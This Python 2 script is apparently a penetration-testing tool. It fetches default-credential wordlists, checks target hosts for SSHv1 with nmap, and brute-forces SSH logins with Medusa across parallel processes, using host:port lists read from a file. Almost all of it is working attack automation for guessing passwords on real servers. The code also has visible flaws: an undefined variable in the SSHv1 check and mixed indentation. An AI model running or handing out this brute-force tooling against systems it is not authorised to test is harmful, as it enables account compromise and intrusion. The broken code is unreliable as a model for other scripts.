#! /usr/bin/env python

from multiprocessing import Queue
import multiprocessing
import commands
import sys
import argparse
import os

origPath = os.getcwd()
toolsPath = "/tmp/tools/"
numProcesses = 10

def downloadFiles():
	import urllib
	if not os.path.exists(toolsPath+"wordList_ssh.txt"):
		testfile = urllib.URLopener()
		testfile.retrieve("https://raw.githubusercontent.com/milo2012/pentest_scripts/master/default_accounts_wordlist/wordList_ssh.txt", toolsPath+"wordList_ssh.txt")
	if not os.path.exists(toolsPath+"wordList_telnet.txt"):
		testfile = urllib.URLopener()
		testfile.retrieve("https://raw.githubusercontent.com/milo2012/pentest_scripts/master/default_accounts_wordlist/wordList_telnet.txt", toolsPath+"wordList_telnet.txt")
		
def RunCommand(fullCmd):
    try:
        return commands.getoutput(fullCmd)
    except:
        return "Error executing command %s" %(fullCmd)
class Worker1(multiprocessing.Process):
 
    def __init__(self,
            work_queue,
            result_queue,
          ):
        multiprocessing.Process.__init__(self)
        self.work_queue = work_queue
        self.result_queue = result_queue
        self.kill_received = False
    def run(self):
        while (not (self.kill_received)) and (self.work_queue.empty()==False):
            try:
                job = self.work_queue.get_nowait()
            except:
                break
            (jobid,hostNo,runCmd) = job       
            rtnVal = (jobid,hostNo,RunCommand(runCmd))
            self.result_queue.put(rtnVal)
        
def execute1(jobs, num_processes=2):
    work_queue = multiprocessing.Queue()
    for job in jobs:
        work_queue.put(job)
 
    result_queue = multiprocessing.Queue()
    worker = []
    for i in range(num_processes):
        worker.append(Worker1(work_queue, result_queue))
        worker[i].start()
    
    results = []
    while len(results) < len(jobs): 
        result = result_queue.get()
        results.append(result)
    results.sort() 
    return (results) 
os.chdir(origPath)

sslList=[]

def runModules(quiet):
	#Start of Module
	results =  "\n- Checking for Nmap SSHv1"
	print results
	jobs = [] 
	jobid = 0

	for host in sslList:
		fullCmd="nmap -sT --script=sshv1 -h "+host[0]+" -p "+host[1]
		if quiet==False:
    			print fullCmd
    		jobs.append((jobid,host[0],fullCmd)) 
    		jobid = jobid+1    
	resultsList = execute1(jobs,numProcesses)
	for i in resultsList:
		if "Server supports SSHv1" in str(i):
			print line
	#End of Module

	#Start of Module
	results =  "\n- Bruteforcing SSH Servers with Medusa"
	print results
	jobs = [] 
	jobid = 0

	for host in sslList:
		fullCmd="medusa -M ssh -C "+toolsPath+"wordList_ssh.txt -h "+host[0]+" -p "+host[1]+" -T4 -t4 -f -F"
		if quiet==False:
    			print fullCmd
    		jobs.append((jobid,host[0],fullCmd)) 
    		jobid = jobid+1    
	resultsList = execute1(jobs,numProcesses)
	for i in resultsList:
   		resultsList1 =  i[2].split("\n")
    		for line in resultsList1:
        		line = line.strip()
			print line
	#End of Module


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-quiet', action='store_true', help='[only show results]')
    parser.add_argument('-file', dest='filename',  action='store', help='[file containing IPs and Ports]')
    parser.add_argument('-threads', dest='numProcesses',  action='store', help='[number of threads]')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    downloadFiles()

    if options.numProcesses:
	numProcesses=int(options.numProcesses)
    else:
	numProcesses=int(10)
    if not options.filename:
        parser.print_help()
        sys.exit(1)
    else:
	with open(options.filename) as f:
    		for line in f:
        		line = line.strip()
        		line1 = line.split(":")
        		hostNo = line1[0]
        		hostPort = line1[1]
        		sslList.append((hostNo,hostPort))

    if options.quiet:
	runModules(quiet=True)
    else:
	runModules(quiet=False)
